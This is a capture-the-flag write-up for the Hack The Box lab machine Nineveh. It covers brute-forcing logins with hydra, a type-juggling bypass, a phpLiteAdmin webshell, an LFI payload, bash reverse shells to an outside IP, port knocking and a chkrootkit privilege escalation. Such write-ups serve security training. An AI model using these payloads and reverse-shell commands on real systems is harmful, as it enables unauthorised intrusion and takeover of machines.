@@ -1,0 +1,185 @@
+HTB-Nineveh.Writeup
+
+ip : 10.10.10.43
+
+Nmap
+----
+- nmap revealed two open ports
+	80 running HTTP
+	443 running HTTPS
+
+- we get a hostname from the nmap result, add that toour /etc/hosts file
+	nineveh.htb 
+
+Enumeration
+-----------
+- since we have a hostname in the nmap result we can also try to brute force for possible vhosts 
+
+	wfuzz -c -u http://10.10.10.43/ -H "Host: FUZZ.nineveh.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 178
+
+- we didnt get any result 
+- visiting port 80 and nineveh.htb we see simple success page from apache 
+- we can try directory brute force against these to find hidden directories
+- found three pages 
+	
+	/info.php
+	/department -> login page with username enumeration vulnerability
+	/server-status
+
+- visiting port 443 and https://nineveh.htb returns an image
+- directory brute forcing port 443 we got three results
+	
+	/db -> login page for phpliteadmin 1.9
+	/server-status
+	/secure_notes -> shows an image 
+
+- we checked for known vulnerabilities for phpliteadmin version 1.9 in searchsploit and got a few
+- examining each of them with -x flag we found remote php code injection to be a good candidate but we need to be logged in first
+- since we dont see any other options we can try brute forcing for passwords
+- brute force with hydra on port 80
+
+	hydra -l admin -p /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:invalid" -t 64
+
+- we found the password
+
+	creds : admin : 1q2w3e4r5t
+- we can also login exploiting the php type juggling bug
+
+	username=admin&password[]=
+
+- brute force with hydra on port 443
+
+	hydra 10.10.10.43 -l admin -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
+
+- we found the password 
+
+	creds : password123
+
+- we login to the web portal of phpliteadmin with the password 
+- on looking around we found out that there is only one database present in there which has no tables
+- the 24044.txt exploit we found earlier from searchsploit says the following 
+	
+	- create a database with .php extention 
+	- create a table with default value for a basic php webshell
+	- view the page 
+
+	lord.php database
+	|_sploit table
+		|_CREATE TABLE 'sploit' ("shell" TEXT default "<?php web shell code?>")
+
+- we can login to port 80 department/login.php using the creds we found earlier
+- on login we got redirected to manage.php which has another image and a note button in the bottom
+- on clicking the note button it just adds ?notes=files/ninevehNotes.txt to the current URL 
+- we can check the URL for LFI vulnerability
+- tried a few and got it working using the payload
+
+	/ninevehNotes/../etc/passwd
+
+- with this we can access the web shell from earlier and get a reverse shell
+
+Shell as www-data (via LFI)
+----------------------------
+- url encode the payload
+
+	http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/lord.php&cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.54/9001 0>%261'
+
+- start a listener with netcat
+
+	nc -nlvp 9001
+
+- we got a shell as www-data
+
+Shell as www-data (via phpinfo.php)
+-----------------------------------
+- if the php is configured with file_uploads = on we can use that along with the LFI vulnerability to get RFI
+- Insomnia provides a Python script that will exploit this
+- we can download it anf get it working 
+- setup the ip, port, phpsessid and other necessary changes to match nineveh
+	
+	- change the payload to include a reverse shell
+	- change the REQ1 to /info.php
+	- change the POST path in LFIREQ to nineveh LFI
+	- added PHPSESSID cookie to the LFIREQ
+
+- with all these changes in place we can start a netcat listener and run the script 
+
+	nc -lnvp 9002
+	python phpinfolfi.py 10.10.10.43 80 100
+
+- we got a shell as wwww-data
+
+Shell as amrois
+---------------
+- without having much to work with we can revisit the images we found on the site earlier 
+- checking the image file in /secure_notes with binwalk
+
+	binwalk nineveh.png
+
+- it says that there is a Zlib compressed data hidden inside the image
+- we can try to extract all the files with the -e flag 
+
+	binwalk -e nineveh.png
+
+- within the extracted files we have a SSH private key and public key for nineveh machine 
+- the public key gimes a username amrois
+- on trying to SSH with the ssh key file we noticed that there is no port 22 open on the machine   
+- we might have a port knocking situation on our hands 
+- we can enumerate the box as www-data further to get an idea on this situation
+- checking on the running processes
+
+	ps auxww
+
+- we found knockd running which is a daemon for port knocking 
+- knockd will set the firewall rules for hitting certain ports in a specific order onorder to open a filtered port
+- we can check /etc/knockd.conf file for the ports which needs to be knocked in order
+	
+	[openSSH]
+ 	sequence = 571, 290, 911
+ 	seq_timeout = 5
+
+- when we hit ports 571 290 and 911 in sync within 5 seconds, it will add a rule to allow our ip to get to port 22
+- we can do this using nmap
+	
+	for i in 571 290 911; do nmap -Pn -p $i --host_timeout 201 --max-retries 0 10.10.10.43; done
+
+- now if we run a scan against port 22 on the machine we will see it as open
+
+	nmap -p 22 10.10.10.43
+
+- now that we have port 22 open we can try ssh into the machine with the ssh key we found 
+	
+	ssh -i id_rsa_nineveh_amrois amrois@10.10.10.43 
+
+- and we are in 
+- grab the user flag
+
+Priv-esc
+--------
+- on checking around the file system we found an unusual directory called /report in the system root directory
+- on inspecting it we found files which were dated fairly recent
+- which means that there might be some kind of cronjob at play doing this on the machine 
+- we ran pspy and found many processes running every minute referencing the /usr/bin/chkrootkit which is tool used to check for signs of rootkits on the machine 
+- we can check for any known exploits for chkrootkit in searchsploit 
+
+	searchsploit chkrootkit
+
+- we found one and its says that any file in $SLAPPER_FILES will run due to a typo in the code
+- the code of SLAPPER_FILES is as follows 
+
+	SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
+   	SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
+   	${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
+
+ - we can add a reverse shell to the /tmp/update and make it executable
+
+ 	echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.54/9003 0>&1'
+#!/bin/bash
+	chmod +x /tmp/update
+
+- start a netcat listener
+
+	nc -nlvp 9003
+
+- the next time chkrootkit runs we will get a reverse shell 
+- in a few minutes we got a shell as root 
+- grab the root flag
